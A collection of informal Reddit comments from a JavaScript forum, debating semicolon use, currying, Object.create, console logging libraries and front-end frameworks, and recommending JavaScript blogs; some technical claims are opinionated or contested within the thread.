What I had mentioned is letting the user use 'default' color schemes for logging and throwing errors, not much more than that. What about an accompanying json file that specified color/size/etc schemes based on keywords... Other than that, you could have it intercept the console errors and format them, again based on the json file, to pretty print to the console including the stack trace. So an uncaught reference error would be red with the variable in blue and the trace in decreasing shades of whatever. I think if you push the normal console.log to some other internal var and replace the pointer to your function, and replicate most functionality, even inheriting from it, it'll be usable as a 1:1 replacement while keeping console.log viable and available. While yours intercepts the errors/warnings/logs etc, parses them, colorizes/etc them as to the output. You'd end up with a nearly irreplaceable lib for anyone and everyone. 
Pretty sure the syntax highlighting is just hand coded.
&gt; Node is a runtime environment - /u/x-skeww 'client-side framework makes it sound like its angular or bootstrap or something that runs in a browser. Its more than that. It is a platform for writing and running applications. Really anything you want. For example, use it to make little command line apps, use it to write a server, use it to manage client-side 3rd party modules, use it to concatenate javascript files together before launching your site. I'm struggling to come up with better examples... if you want clarification, why not ask here on /r/javascript I'm sure others are better equipped to explain. I tend to use it for front-end tooling pretty exclusively. That is, having a "build" step in my development work-flow, where I put my source files through various processes *before* deploying to the server.
Aha, I understand. That's really quite horrible...
Trying to lint `var a = 100` in JSLint, without a semicolon, results in: &gt;Expected ';' and instead saw '(end)'. [I can't see any options relatied to semicolons...](http://d.mort.coffee/img/jslintsemicolon.png)
The bikeshed shall be constructed with semicolons.
IMHO it's a pure personal preference and just related to coding style and has nothing to do with tool support. Neither any up-to-date minification (e.g. uglifyjs) nor linting (e.g. jshint, eslint) nor style-checking (e.g. jscs) tools have a problem if you leave out semicolons at all (they just have to be configured accordingly). Instead, leave semicolons out if you are a code purist who is convinced that code always should be written as concise as possible and with as less "syntactic sugar" as possible. Insert semicolons if you are in the other camp of people who have no problem with syntactic sugar and instead like it to code in a more syntactically explicit way. Both camps have their pros and cons and IMHO there is no "right" camp. But (as always with coding styles) if you decide for one camp, then (at least on a project basis) stick with the chosen camp and do not intermix the two styles.
You can also make manual DOM manipulation very performant. You can make jQuery very performant. More performant than React, for sure. The nice thing about React is that you have to try pretty hard to bomb performance. The framework gives you performance for almost free. &gt; Jumping ship isn't the answer because the grass is rarely greener on the other side. Jumping ship from Angular 1.x in the near future is almost definitely a winning bet.
Yup, just jshint and eslint. JSLint is old and obsolete. One of the reasons it was forked was because it was too opinionated, the ASI debate being a good example. 
It's all mock up data that is in the database so it's not a huge concern and usually if I leave them out I get told that's my problem when it's not Ok so with that I do know for sure that it at least calls the XML, firefox shoes the GET url and it has what it should as the response. Earlier someone told me that I would be better off converting the XML into a JavaScript object if I plan to use it with handlebars.js, but I am not sure how I would go about that, I tried to google it, but all the examples just made me confused about it (and when I tried one all I got returned was an empty object ?) 
Lemminman's post is a good start, you need to appreciate that when you read this data in its just an array of objects that you can pick thru using all the methods for any JavaScript object. That's a key reason why the JSON format is specified as it is. Example: var xx = {"aa": 5, "bb": "How about this"}; var styx = [ { "id": 200, "name": "Lowe Booth", "age": 26, "email": "Lowe_Booth@Scenty.com", "phone": "950-458-2519" }, { "id": 201, "name": "Whitley Bernard", "age": 53, "email": "Whitley_Bernard@Pasturia.com", "phone": "916-448-2484" } ]; console.log (xx.aa); // prints 6 console.log (styx[0].id); // prints 200 console.log (styx[0].name); // prints Lowe Booth console.log (styx[1].phone); // prints 916-448-2484 [JSON Server](https://github.com/typicode/json-server) to convert the sample data into a REST server that you can retrieve with standard AJAX calls. I was able to wget your sample data, feed it straight to JSON server and its visible. Does look like a bunch of data bases, but I did not feel like fixing that. [JSON.parse()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/parse) will tell you how modern apps read JSON strings (everyone is/has moving away from eval()) Also the data looks a lot like the output of (http://www.json-generator.com/) which I have used quit of few times to generate random data. I stay away from the beta version, without setting up an account you only get one shot of data, and using them for my data host is not where I want to go. By the by, this is my first post on reddit EVER. I just created this account, been lurking for quit a while.
[This](http://cube-drone.com/comics/c/the-many-angular-ones).
Yeaaaa this is rad. 
Ah, the tired old "You just don't get it" argument. Well, I might buy that if I were the only one with this perspective but there are far too many people who share it for this to be about me.
If you don't understand JavaScript automatic semicolon insertion, you should use them at the end of every (non-block) statement. If you do understand it, it's up to your personal convention. Just be sure to keep the same convention throughout. I as a personal preference do not use semicolons where they are not needed anymore. I like the cleaner look of less.
Of all the one word replies, [this](http://javascriptissexy.com/understand-javascripts-this-with-clarity-and-master-it/) is the one you choose?!
Legacy. I have a handful of friends who are just starting to get comfortable with JS on the server. Most of them loath it, as they are DevOps engineers who support node as a one-off sort of wart that is pinned against Node 0.8 or something equally old. They are frustrated by ES5, they are frustrated by old versions of NPM, they are frustrated by their circa-2008 knowledge of JS and the DOM. Now, give an Erlang or Ruby guy a fresh take on modern versions of server-side JS? `io.js` 2.x with most of ES6 working out of the box? `npm`2.x which is easily the best package manager to ever see the light of day. Atom, gulp, eslint, phonegap, Chrome Canary, Mocha, Karma? Things are _awesome_ right now. You just have to forget all the pain up until this point to enjoy it properly.
yes. next question please.
Optional. Optional and optional. Having to use semicolons everywhere is like having to put training wheels on a motorcycle. Maybe it's good for juniors, but if you're a pro you shouldn't need them. 
 If the code is formatted nicely, you shouldn't need semicolons to read it.
very cool example! now can you ELI5 what is going on here? 
Oh god, you're right, I'm a monster 
&gt; I've always structured my code on the basis that I needed to declare/initialise before I call Continue doing that. It makes your code more readable.
It'd be easier if you told us what you wanted help with.
To op: Learn the ASI rules properly, then make your own choice. You can get bitten by restricted productions even if you always add semicolons. To those blindly suggesting "always use semicolons", please read this carefully: http://slides.com/evanyou/semicolons#/
If you like this, you might also like https://github.com/visionmedia/debug
Don't modify objects you don't own.
What are you talking about? I never said anything about the function keyword. I'm talking about things like the existence of new, this, the fact that 'class' is a reserved word even though it wasn't used (until very recently), the toString function on every object, primitives being "objects" even when they aren't, all sorts of little things. I know that when *I* started using JavaScript, I assumed it was like Java (and other C style languages) because you could kinda sorta program the same way and it would kinda sorta work, until it didn't and then I got angry, just like most people who start with the language. I wasn't confused into thinking that JavaScript was Java any more than I thought C++ was C at the time: not at all.
Decorators are ES7, but in the post (I'm the author) I'm exploring the internal TypeScript implementation of decorators. The __decorator function (generated by TypeScript) is a fallback that allow us to use decorators today (long before ES7 becomes available) I don't think ES7 will use that function at all.
Usually people that says yes have no idea what is going on and use what is easier to avoid problems.
This library is mostly a fluid wrapper of the straight forward native API. Grouping can be done with console.group(). Styling is also possible. Also check out console.table() which is pretty sweet!
use knockout.js 
Quick google search: http://jshint.com/docs/options/#asi http://eslint.org/docs/rules/semi.html
Not understood...
Not sure if you're aware but the built-in console already has console.info, console.warn, and console.error
globally: sudo npm update -g project level: npm update
Legit
Here is a [long list of resources](https://github.com/ericelliott/essential-javascript-links). I think closures, and a basic understanding of prototypes are a must. Hope that helps. 
I'm assuming you are mainly talking front end so I'll stick with that. You should get proficient with some of the things outside of straight "coding". Look at upping your Architecture/Workflow/Tooling skills, and being able to create a mid sized project from scratch. Do you understand separation of concerns? Can you work with one any of the frame works? Backbone, Ember, Angular, React, and understand what they are doing? Learn how to use Gulp or Grunt for your builds so that your project isn't a nightmare. Do you know how to use Git? Do you work with a proper git flow? 
That people usually try to explain its concepts from the point of view of another language. For example, how people tend to explain 'this' based on a function belonging to an object, when 'this' is actually nothing to do with belonging, but everything to do with its invocation. Starting with irrelevant assumptions makes it much harder to understand. This is also true when people explain variable scoping, function references, function binding, and all that really good stuff that JavaScript actually makes very easy.
You can use a templating lib, like Handlebars. Or if you think it's an overkill, innerHTML is your friend. myString += "&lt;div id='" + itemId +"'&gt;" + itemLabel +"&lt;/div&gt;" It's WAY faster than assembling individual items.
These are quite handy, thanks
Not using the bad parts isn't "hacking something to make it good enough." It's learning from others and the warts of a given technology and not using those warts.
AFAIK React is not written using Babel and if you look closer, you will also find Coffeescript and Typescript as dev deps in package.json. 
What do you know now?
Yes. var f = function () { return { test: 1 } } f() &gt; undefined var f = function () { return { test: 1 } } f() &gt; Object {test: 1}
I prefer `&lt;script type='text/template' id='name-of-the-template'&gt;`
The thing you want to Google for is called "Currying". Good luck, hope you get the job! 
lol.
Assuming you already have a decent network of recruiters - just contact them and say you're looking for a contract role. On the business side of things, you'll need to set up a limited company, business bank account and should probably get yourself an accountant who will take care of all the legal and tax stuff (they're not that expensive - usually around £80-£120 per month). You could always contract through an umbrella company of course, but then you'll be taxed almost at PAYE levels, negating one of the biggest draws of contracting.
You're right of course that Node is not a client side framework. I chose my words poorly. I thought you yourself were confused on this point due to your question: "Is node a client-side framework?" However, Node *is* relevant to this discussion. cheeeeeese was reluctant to use React due to the JSX dependency on Node. I encouraged him to embrace node, and that devolved into a discussion of the nature of node. No one here is trying to say Node is analogous to React, Polymer or any other front-end framework
Minify does not break because of this. That's either outdated info or misinformation entirely.
Multiple statements per line is pretty consistently frowned upon. Perhaps more than omitting semicolons even. That's hardly a reason to use them.
Yeah, that. (Although I've never, ever seen an instance of currying that was actually useful and not academic wankery)
Like any other style choice, it's most often opinion only. Spaces vs tabs, how many spaces, single or double quotes, semi or not, line spacing, spaces before function parens. The best choice is to have a lint tool manage whatever choice your team has chosen. 
Yes, but the code required to do it is not something that should ever be used in real team projects. First, let's make the first function simpler using some ES6. (This can also be done in ES5, but it's a little bit longer) function sum(...args) { return args.reduce((a, b) =&gt; a + b, 0); } The problem here is that this is returning a number, not a function, so you can't call the result. So we need to modify it so that instead of returning the value directly as a Number, we return a function that when called will add any new arguments to the previous result. We can do this using bind. function sum(...args) { let val = args.reduce((a, b) =&gt; a + b, 0); let result = sum.bind(null, val); return result; } This returns a new function with its first parameter set to be equal to the current sum, and when it's called, it will add all other parameters to the previous sum. But we still have a problem since that doesn't expose the result of the sum anywhere outside of the function itself. When you try to log that, the output will just stringify the function. To solve that, we override toString and valueOf with functions that will return the string and numeric forms. function sum(...args) { let val = args.reduce((a, b) =&gt; a + b, 0); let result = sum.bind(null, val); result.toString = () =&gt; "" + val; result.valueOf = () =&gt; val; return result; } console.log(sum(1, 2, 3)(4)(5, 6)) // 21 That will cast the resulting value to a string by calling toString() for logging it in the console. Overriding valueOf() means that you can do things like this: sum(1, 2, 3) * 2; // 12 Edit: Add initialValue of 0 to the .reduce(..., 0) calls so that sum() without parameters doesn't cause a TypeError.
Yes. If you're using a decent code linter, then it will throw an error by default if you omit them and rightfully so.
Your code fails in quite a few cases: console.log(sum(1, 2)); // Stringifies the function console.log(sum(1, 2)(3)(4)(5)); // TypeError console.log(sum(1, 2, 3, 4)(5)); // TypeError 
I already hated Fat because he is an arogant developer who thinks because he created a popular library that he is some kind of God (I've met him a couple of times at events). After reading this, I hate him even more. When the Godfather of Javascript (besides Brendan Eich himself) is giving you advice, take it. Crockford has been working with Javascript longer than script kiddies like Fat have been. I can't believe I didn't know about this until now. Great link.
Declaring a variable in a loop can result in a large number of variables being declared faster than the garbage collector can free up the unused memory. Some garbage collection methods involve waiting until free space gets low before it really gets serious about clearing up memory. Javascript is incredibly fast and can potentially create variables faster than the GC can clean up unused variables, causing performance problems and even crashes. It's not a common situation, but it does happen and I've found it's generally best to avoid the situation.
There Is More Than One Way To Do It But Some Consistency Isn't Necessarily A Bad Thing Either?
Here is a auto-curry implementation with your `sum` function: http://jsfiddle.net/aj9t0so3/3/ If you want some useful examples of currying, check out the Ramda library: http://ramdajs.com/ 
React or Web Components is how to get reusable UI components.
If you're going to create objects without a constructor, then you might as well give Person a create() method that calls Object.create and then initialize(), so nobody has to remember to do both steps. Personally, I despise the `new` operator and everything it stands for in Javascript: it's a horrible hack that would've been unnecessary if something like Object.create() were in the very first version of Javascript, and then we never would've had the matching hack of functions having prototypes. (In truth, I believe the *true* reason Javascript even *has* a `new` operator is because Brendan Eich was *ordered* to make Javascript look like a watered-down version of Java.) That being said: 1. If you need to support older browsers (i.e., IE8 and lower) you can't use Object.create 2. Object.create() is slow, and the objects it creates may be slow as well, depending on the engine. (That is, most JS engines don't yet have all the same optimizations available for Object.create as they do for `new`) 3. `Object.create()` and prototype-based object models are (sadly) not mainstream in JS, so you may end up fighting an uphill battle with other developers to accept your code if it's prototype-based. If the point of your library isn't to support people who've already decided they *want* a prototype-based API, they're probably going to expect to use `new` to create objects and get pissy at you if they can't. 
The idiomatic use of Object.create() isn't to replace `new`, but to support use cases where you really do need an object to inherit from another object. For example, the Mocha test framework creates "context" objects for nested suites that inherit from the enclosing suites' contexts. There is no meaningful class or constructor there, just objects that inherit from each other. 
Using underscore.js or lodash.js var f = _.template('&lt;ul&gt;&lt;% _.each(list, function(n){ %&gt; &lt;li&gt;&lt;%=n %&gt;&lt;/li&gt;&lt;% } %&gt;'); f({list:[1,2,3,4,5]}); 
Take a look at RamdaJS - been using it quite a bit recently, and lots of functional concepts like currying / partial application / etc start to make more sense. Basically, in Ramda - most of the libraries functions are curried by default. var find10 = R.filter(R.propEq('id',10)); R.filter is now a function, that returned a function that is waiting for additional parameters. In this case - the list collection to actually filter on. R.propEq is also a function that will return true/false if a property called 'id' equals 10. It's not too often I'll use R.curry directly, but it's used heavily within the other library methods that I do use. I do use the partial application quite a bit. However, a simple (but not academic-wankery) could be building a simple logger. function logger(level, message,data) { console.log('[' + level + '] -&gt; ' + message,data) } var error = R.curry(logger)('error'); var info = R.curry(logger)('info'); var personError = error('Person Error Object'); error('Some Error',{data: 'ok'}); info('Some Info',{data: 'ok'}); personError({age: 10}); This is pretty similar to the end result of: function makeLogger(level) { return function(message) { return function(data) { console.log('[' + level + '] -&gt; ' + message,data) } } } var someLogger = makeLogger('error')('ugly'); someLogger('Data!'); Before I fully got my head around currying - I had lots of code kind of like that - 'makeX' that would be a function that would return a function, and had a very simple 'well, duh moment' of thats pretty much what currying is, and started to find more practical ways of making use of it outside of 'academic-wankery' (of which - most things you read on functional programming/javascript tends to fall into that camp) 
Yeah. Yeoman is a great way to start in a project quickly. It gets all that boilerplate out of the way. But it hides all the pain points from you. And then something breaks and you don't know how to fix it because it "just always worked". Building your own boilerplate as an exercise, will be a good step in learning how to architect a project but also give you an appreciation for what it is doing for you. 
By sometimes you mean like 97% of the time? The only thing you have to watch out for is when you start your line with opening parenthesis, square bracket or (in some really really rare cases) with arithmetic operator.
Partial application is great, functional techniques have made my code better as well. But currying just doesn't seem useful. What you have up there seems to me to be more about partial application.
There's nothing wrong with using or not using semicolons. It's just a personal preference. If you want to omit them then there's only one thing to watch out for (http://mislav.uniqpath.com/2010/05/semicolons/). Build tools will handle this just fine. A lot of people here just got used to using semicolons and that's why they say it's more readable, but for some people it's just the opposite - they add more noise to the code without providing anything useful.
Who needs good developers when you have semicolons? Also see: vue, npm, webtorrent, deku, dat, etc. If an applicant made any of those projects I could really care less about the semicolons. 
I'm glad I don't work with poeple with limited vision such as yourself.
&gt; Several, InsertRule I would say is a bad thing, as the browsers can better optimize CSS rules they get at page load rather than late into the page life. There are two important rules in optimization. * Premature optimization is source of evil. * Any claim on performance should be proven by benchmark. 
I think the latter is the more important part. If you're stuck there going "man I really need this style inserted and I have no idea where the CSS sheet is" well... you have bigger problems than your handy toolkit. Use it if you have to, but it's ugly either way.
Is there a real world scenario where putting an iife into the middle of a file like this is a good idea, even with semicolons?
Seat belt is a lint tool. Semicolons are like driving with headlights during the day. They don't save you from anything, but some people think they are worth it anyway. 
That is pretty much what they did with "use strict" though. What other features come to mind where things are bad because of backward compatibility?
You're just so charming. I wish I could be more like you.
Which is crazy to me! I had no idea any of that existed, at all. I mean, I knew it must exist somewhere, since you can clearly see groups while logging things like objects/arrays/dom/etc -- I just didn't know we had access to the API through javascript. TIL.
By that logic the only way something isn't a problem is if everyone understands it. Besides, I said you weren't alone. That's primarily the teams fault, the docs were pretty bad for a really long time. And sure there are plenty of people that have issues with Angular, there also happens to be plenty of people that call themselves "web developers" when they know HTML. And if there's anything I've learned, it's that opinions in this industry about tools tend to gravitate towards easy = good.
Great response
This was always my argument with jquery, new developers jumping in to jquery without know how to do basic JS. 
Is it too much to ask for a site pushing programming to get basic CSS correct? http://d.pr/i/181h6
That's not addressing my comment, you're bashing me. You don't have a point to make except to spread programming dogma, and apparently trolling. 
Some of these are a sign of a code and/or interface smell.
Is it possible? Yes. Is it realistic for production quality code? Unlikely, unless you're creating an intentionally ambiguous API. How? The "trick" is to have a function *return a function* which also has an override for the [`.valueOf`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/valueOf) method, which will cause the function to coerce to a primitive number when needed, which would represent the accumulated sum. Why is this gross? It relies on type coercion, which is fundamentally more complex than dealing with a simple type. The return value could be viewed as *both* a function (as it can be called) and a number (as it can be used with operators and functions which expect a primitive Number). Due to this duality, ambiguity can arise, which can lead to fear, uncertainty, and doubt.
If it's that easy to find a bench then just put it in your initial comment lol. 
Check out Foundation for Sites. IMO it is a much better framework than Bootstrap is. It is far from perfect, but Zurb (the company that supports it) is awesome. If you fix bugs and commit to their repo, you'll sometimes get free swag (i.e. I took their JS and re-wrote part of it to be less specific which was a big request for many in the community, so they sent me a t-shirt and a bunch of little do-dads). As far as @fat, he just seems to have an ego. Just follow him on Twitter and you'll see he can be very abusive/combative (at least to me). It shows there and also in the Bootstrap issues on Github. Basically he seems to think he is the tits when it comes to website design and best practices and if you don't agree with him, then you're wrong. He has strong conviction and doesn't seem to like to have an open mind. 
My absolute favorite is, **http://javascriptissexy.com/**. However, there are a lot of very good JavaScript websites out there including, * http://dailyjs.com/ (check this daily -- great for keeping up-to-date) * http://www.nczonline.net/blog/ (In-depth, well-written, and just overall excellent blog) * http://javascriptweekly.com/ (If you are OK with a newletter sign up for this one, if you don't want to sign up, check it every Friday and pick through the weeks best posts) * http://addyosmani.com/blog/ (Another very well written blog that I look forward to reading) * http://www.bennadel.com/ (Last but not least is another favorite blog of mine, and written in a very accessible and humorous style) 
with your vanilla-js background it is no wonder that you find angular hard to grasp and/or don't agree with its design decisions. It is a huge abstraction and forces you to do everything 'the angular way' that said, it is worth diving into it. You will learn it best by building something. I recommend going through the official example app tutorial at https://docs.angularjs.org/tutorial/step_00 alternatives are: backbone.js (it has a very small footprint and will feel a lot closer to vanilla js) react (basically only the View part in MVC, but also very small and easy to get started) ember (a little less steep learning curve than angular, but also a big abstraction in itself)
checking all of these now, thanks for the comments BTW
I remember the bennadel blog when I was learning NG, I always loved/never understood the random pictures at the top of his posts
Jump into something new! If you've been using ES5 (ie: writing js for the browser directly), try downloading a new version of http://iojs.org and [learn ES6](https://github.com/ericdouglas/ES6-Learning) - then put together your own cool front-end stack by hand with NPM and [Webpack](http://webpack.github.io/) and [BabelJS](https://babeljs.io/)! Don't forget to codify your opinions into a nice [.eslintrc](http://eslint.org/) ruleset - you can hook up [Gulp](http://gulpjs.com/) to watch your files and lint them directly, or you can hack it into the [Atom](https://atom.io/) editor, which is written in JavaScript! A lot of people rage at the JS community for changing so often - but riding that wave of innovation for awhile will expose you to new/awesome/awful parts of JavaScript. Just choose a reasonably small personal project and bust it out with tools you've never used before. Sometimes you'll hate it, sometimes you'll fall in love. But you'll end up with opinions and experience which is the only path to getting better at something :)
[Stop misquoting Donald Knuth!](http://www.joshbarczak.com/blog/?m=201501)
How to drive a programmer crazy: Replace 1 semicolon with a [Greek question mark](http://www.fileformat.info/info/unicode/char/037e/index.htm). They look exactly like semicolons in every typeface, but have a completely different Unicode representation, and won't be interpreted as semicolons.
CSS Media Queries? 
My point was just that special circumstances are the only good reason for using Object.create() in the first place, since you don't *need* it just to set up class inheritance. So the advent of ES6 doesn't actually change anything, except make it easier for people to not use cross-compilers... oh wait, ES6 doesn't actually work without cross-compilers yet. ;-)
There is matchMedia for media queries in the js world. Debounce is good for much more than just readjusting styles based on window width. Not to mention that media queries doesn't cover scrolling.
a pet peeve of mine: &gt; d=new Date() Date 2015-02-25T09:33:14.482Z &gt; d+0 "Wed Feb 25 2015 07:33:14 GMT-0200 (UYST)0" &gt; d-0 1424856794482 http://cdn.alltheragefaces.com/img/faces/png/misc-jackie-chan.png
The JS part isn't really that weird, it only behaves weird because {} as the first part of the statement is interpreted as a code block. ({}) + [] is the same as [] + {} and ({}) + {} comes out as "[object Object][object Object]". If you put them into variables then the behaviour becomes consistent, which is the only realistic way you'd ever run into adding an object to an object (if ever).
Do you have an example "app" or game idea that could be useful in practicing the use of call and apply? Or will it be clear in what circumstances to use them once I've read a few articles?
Also, this was all very good advice. I like the idea of converting callback code to promise code and then back
I guess I just never use that syntax. Haven't run into a single issue in practice that required me to use semicolons. I certainly don't care what you do, but my projects won't use them. At least until we convert to TypeScript where they didn't appear optional at all.
&gt; I guess I just never use that syntax. Spread is new. Currently, only Firefox supports it. You can only use it if you use Babel/Traceur or if you write something Gecko-specific (e.g. a Firefox addon or something for Firefox OS). &gt; At least until we convert to TypeScript where they didn't appear optional at all. They aren't optional. There are cases where they can be omitted. That's not quite the same thing.
All I am saying... Is give scripts a chance https://blog.cesarandreu.com/posts/give_npm_scripts_a_chance
It's really quite avoidable if you use semicolons :)
what problem is this solving?
Currying is about making a function that does partial application on its own.
Well, it's a function. === will never work, because a function isn't a number. == or "+sum(...) ===" does work though.
Have you guys seen [this](http://matthewdean.me/2014/05/dangerous-punctuation/)?
Blogs I follow that haven't been mentioned yet (kudos to /u/nigglytuff for covering some really good ones!): * [David Walsh– http://davidwalsh.name/tutorials/javascript](http://davidwalsh.name/tutorials/javascript) (I like him a lot, his tutorials are well-written and educational.) * [SitePoint - http://sitepoint.com/javascript/](http://www.sitepoint.com/javascript/) (This tends to have more tutorial type stuff, but I still find cool posts here) * [Paul Irish is legit – http://paulirish.com/](http://www.paulirish.com/) (Paul Irish is legit) I also really like Addy, javascriptissexy, JSWeekly, and /r/javascript of course :) I *also* send a front end digest every Mon, Wed, Fri (sorry, I just *had to* mention it since it's relevant!). It's not *only* JS stuff, but I'm personally more interested in JS and will post anything useful/interesting I find online. Here are the most recent emails, FYI, archived: * [Live Twitter feeds in Emails, an Angular Twitter app using oAuth, Comparison of JS graphing libs](http://us11.campaign-archive1.com/?u=3f252919fa322dd0255f6fe73&amp;id=5418d2a6a7) * [How to Design Good Forms, 20 Years of JS, New releases of Angular + Polymer](http://us11.campaign-archive1.com/?u=3f252919fa322dd0255f6fe73&amp;id=e0bc827306) * [Being overwhelmed in this industry. How Spotify's app uses JS. Useful sublime text editor plugins.](http://us11.campaign-archive1.com/?u=3f252919fa322dd0255f6fe73&amp;id=414be4458f) Good luck finding what works for you! Edit: I hope some of the stuff I've shared isn't too beginner! These are just what I follow.
Thank you very much, I'll look.into it!
And they do everything else as well. I dislike using large modules, when all I need is one specific module that does one of the things.
It will cause the browser also to parse your code twice. First as normal but detects a lack of a ; It will then add the ; itself and re-parse the statement. So not least of the intent errors others mentioned where you inadvertently mix two separate statements, even an innocuous console.log () without a ; will get parsed twice.
You can load specific functions from lodash pretty easily these days
&gt; In the first case d is a string It's coerced to string because reasons. As usual, the right thing to do would be to throw a type error, because, as usual, this is complete nonsense. Subtracting a number from a date? What does that mean? What's 5 apples minus 7 bananas? Antimatter fruit salad?
[A better link to that same content](http://www.joshbarczak.com/blog/?p=580). Better because it has comments.
&gt; 5 apples minus 7 bananas -2 fruits. In my mind it is, so this must be the right answer.
With JavaScript, the answer would be of course `NaN`. If there is a valueOf method, you'd get -2. &gt; ({valueOf() {return 5}}) - ({valueOf() {return 7}}) -2 Well, either answer is wrong and useless. Pretending that this is totally okay didn't improve anything.
What you are asking is a very highweight task. You should delegate this task to a map server solution, it will be easier, more maintainable and also lightweight for the client in the long term
Ruby, and sadly it's the one I've used the least. I've spent the last 15 months in Python/JS and while I have grown to appreciate many of Python's facets I still long for the terseness and elegance of Ruby. Python always feels like Legos to me. You can see where each brick was connected, you can take it off and swap it out with something else, it's great for planning out ideas, etc, but at the end of the day it's still going to have edges that you can't smooth out. Ruby makes me feel like a master sculptor with a block of clay. The level of detail I feel I can add is near-infinite because I can mold it to do anything I want. I have so many options - if I want to be more functional, I can, if I want to be more imperative, I can, if I want a bunch of objects and classes, I can go that route, if I want immutable structures and pure functions, I can. And all the while Ruby doesn't push me down any particular path, just offers me tools for what I want to do.
&gt;Well, either answer is wrong and useless. Pretending that this is totally okay didn't improve anything. Yup, it's one of those things where both JS and PHP are incoherent, bordering to silly sometimes. I've considered making a pull request to PHP where strings are evaluated to false if they rhyme with "false" or match it by at least 80% of the letters. Should be close enough. ¯\\_(ツ)_/¯ But now they are caught in legacy hell, I guess.
Well, I wouldn't know. I haven't asked everyone ;p As for myself... I quite like Clojure.
The point was that doing math with incompatible units (types) is nonsense. Your "-340g" answer is complete nonsense, too. The only correct answer is that you can't subtract 7 bananas from 5 apples. You can't even do that mathematically. "7b - 5a" is the final result.
PHP is the only language I know where this stuff is even worse. This is true: '5 apples' + '7 bananas' == '12 fruits' This is -2: '5 apples' - '7 bananas' It's like they looked at all the options to handle this and then went with the worst one. They did it for the lulz, probably.
Then how would you organize your code? Global scope is not ideal for variables and functions because everybody could modify them. How would you guarantee that if you have a widget on the page then the internal state of that is not effected by another widget on the same page? The "we have a standard not to use those methods, variables" is not a good response. Btw, I think with the new component model (which I'm not familiar with yet since I'm a Java developer - nice spotted :) ) is pointing towards to use encapsulation and OOP in JavaScript code as well. OOP is not something which punishes you but a methodology you can use to organize your code to be more logical for your needs. And if you have an object hierarchy anyway (page, main content, widget A, widget B) why wouldn't you use this method to organize the code? But if you have any better solution (no, not the everything in one js file which is 3000+ lines long - that's crap, not solution), you can change my mind :) (Really! I want to deep dive in JS nowadays because I don't like it, but I have to work with it... so I'm trying to learn it well now and see if I could like the language and the methodologies a bit more).
http://adripofjavascript.com/ 
First of all - since when does JS have OFFICIAL style guideline? All JS style guidelines ARE personal opinions. Here's one: https://github.com/madrobby/pragmatic.js Oh wait, that one says not to use semicolons and ugly code which you called "few exceptions". Stop being so arrogant.
&gt; First of all - since when does JS have OFFICIAL style guideline? I didn't mean to imply it does. Companies and larger projects typically have style guides though. "Just follow the style guide [of this project or from the company you're currently working for]. Generally, this means that you'll have to use semicolons whether you like it or not." I assumed the "generally" there would make it clear enough.
English
&gt; No. It doesn't. The point of frameworks is to establish useful idioms. The decision to use "ES7, TypeScript, Coffeescript" etc. is just one more decision neither I or my team wants to have to make after we've decided our stack. And if you choose Aurelia, this language is ES7. All of the examples, all of the framework code and all of the community is and will be living on the ES7 ship. TypeScript and CoffeScript are mentioned there only for those shops who have already chosen the particular flavor of the _compile-to-js_ language and should not be your concern. If CoffeScript and friends is not your thing, then just plain ignore it! &gt; I want consistency. How do I enforce consistency if the framework authors themselves can't? You can compile Python to JS, and yet I don't see Python listed as supported. Pick a language. Stick to it. How exactly does saying _"we will not require you to significantly rewrite your existing codebase just to use our framework"_ end up sounding inconsistent? To me it sounds more like good engineering... YMMV of course... &gt; Your tool isn't useful for me if I don't learn good design patterns for a language while using it. You will not learn anything from a framework, if you let yourself be distracted by some inconsequential minor detail in the introduction on the framework homepage, meant clearly to attract (or rather not repel) customers/shops that use those languages, that you do not ever even need or have to care about? Has this choice caused authors of the framework to somehow make the framework less flexible or worse off than without? Would actively limiting language support to only ES7, been somehow better?
*slow clap*
[Stack overflow agrees with you](https://stackoverflow.com/questions/3684923/javascript-variables-declare-outside-or-inside-loop) I hadn't thought about that. Apparently Actionscript is the same way. In most garbage collected languages, though, you should declare them outside loops. Sorry /r/lemminman
shithammer.js cuntstomper.js is pretty good too
IMO it's worth mentioning/thinking about the difference between `debounce`: &gt;Creates and returns a new debounced version of the passed function which will postpone its execution until after wait milliseconds have elapsed since the last time it was invoked. And `throttle`: &gt;Creates and returns a new, throttled version of the passed function, that, when invoked repeatedly, will only actually call the original function at most once per every wait milliseconds. 
It's an object **literal**, not an object literaly, FYI. Also JavaScript is dynamically typed -- you don't define the types of function parameters. So something like this: `this.enterDigit(String digit)` is not correct syntax and throws an error. It should just be: this.enterDigit(digit) { // do something with digit }
In this language inheritance is not related to scope. For instance `this` keyword does nothing to provide access to the scope model, most typically referred to as the *scope chain*. JavaScript uses lexical scope for its scope model. I attempt to explain it in the following links: * http://prettydiff.com/guide/closure_with_jsscope.xhtml * http://prettydiff.com/guide/unrelated_closureToAChild.xhtml OOP is a strong model for declarative code that is structured around the idea of using objects to define custom types (models) that then provide the blueprints for additional constructs. You don't need inheritance to achieve OOP. Even still I do not code this way since I prefer a very imperative approach.
I have been avoiding the bad parts of JS for so long, I almost forgot they even exist anymore. And considering ES6 fixes a lot of issues while tools like Traceur/Babel allow me to write code without having to deal with monstrosities like XMLHttpRequest while still avoiding necessary libraries, I'd soon forget the old horrors of the language. If JS allowed us to define Integers, that would be nice I guess